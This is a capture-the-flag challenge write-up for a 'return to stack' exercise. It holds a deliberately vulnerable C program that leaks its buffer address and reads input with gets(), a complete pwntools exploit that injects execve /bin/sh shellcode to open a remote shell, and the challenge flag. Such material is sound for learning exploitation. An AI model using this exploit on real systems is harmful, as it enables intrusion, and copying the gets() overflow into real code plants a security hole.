# Return 2 Stack

Difficulty Level: Hard
 
Insert shellcode but this time try jumping where it is located
 
Connect via `nc challenge.ctf-fun.xyz 14012`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- no hints provided


## Deployment

```bash
cd service
sudo ./return2stack.sh &
```

## Solution
Looking at the source code, we see that the location is printed and we can overflow buffer.

```c
#include <stdio.h>

void vulnerable(){
	char buffer[64] = {0x00};

	printf("Try putting a shellcode and redirect the return address to the shellcode.\nNote that ASLR is enabled so buffer location always changes.\n");

	printf("Location of buffer: %p\n", buffer);
	gets(buffer);
}

int main(){
	setvbuf(stdout, NULL, _IONBF, 0);

	vulnerable();
}
```

The location of buffer always changes due to ASLR but it is printed for us to use. Make use of python sockets to receive the location then send a payload to jump to it. Same payload for shellcoder can be used here.

```python
"""
This exercise looks into returning to a stack location.
With ASLR included, I made it print the location of the buffer so that it is easier to reference to.

All you need to do is insert the shellcode and make the return address point to the shell code.
"""

from pwn import *

def main():
	#io = process('./return2stack')
	io = remote("challenge.ctf-fun.xyz", 14012)

	io.recvuntil(': ')

	buffer_loc = io.recv().decode()[:-1]
	log.info(f"Buffer location received: {buffer_loc}")
	
	# http://shell-storm.org/shellcode/files/shellcode-811.php
	shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"
	shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
	shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
	shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"

	padding = b'A' * (76 - len(shellcode))

	shell_loc = p32(int(buffer_loc, 16))

	payload = shellcode + padding + shell_loc

	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()
```
### Flag
19C4{Ex3CuTab1e_sT4ck_1z_5T0nkz}
